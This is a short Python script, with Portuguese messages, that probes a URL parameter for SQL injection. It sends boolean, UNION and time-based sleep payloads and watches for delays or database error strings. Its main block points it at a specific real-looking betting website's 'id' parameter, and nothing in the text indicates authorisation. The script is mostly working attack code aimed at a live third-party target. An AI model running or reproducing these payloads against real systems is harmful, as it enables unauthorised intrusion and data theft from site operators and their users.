import requests
import time

def test_sqli(url, param_name):
    payloads = [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT pg_sleep(5)--",
        "\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
    ]
    
    print(f"[*] Testando SQL Injection no parâmetro: {param_name}")
    
    for payload in payloads:
        test_url = f"{url}&{param_name}={payload}"
        start_time = time.time()
        try:
            response = requests.get(test_url, timeout=15)
            duration = time.time() - start_time
            
            if duration >= 5:
                print(f"[!!!] POSSÍVEL SQL INJECTION (Time-based) detectado com payload: {payload}")
                return payload
            
            # Verificar mudanças no conteúdo ou erros de banco de dados
            if any(error in response.text.lower() for error in ["sql syntax", "mysql_fetch", "sqlite3", "postgresql"]):
                print(f"[!!!] POSSÍVEL SQL INJECTION (Error-based) detectado com payload: {payload}")
                return payload
                
        except Exception as e:
            pass
            
    print("[-] Nenhum SQL Injection óbvio detectado no parâmetro ID.")
    return None

if __name__ == "__main__":
    base_url = "https://w1-panda.bet/?id=74060664"
    test_sqli(base_url, "id")
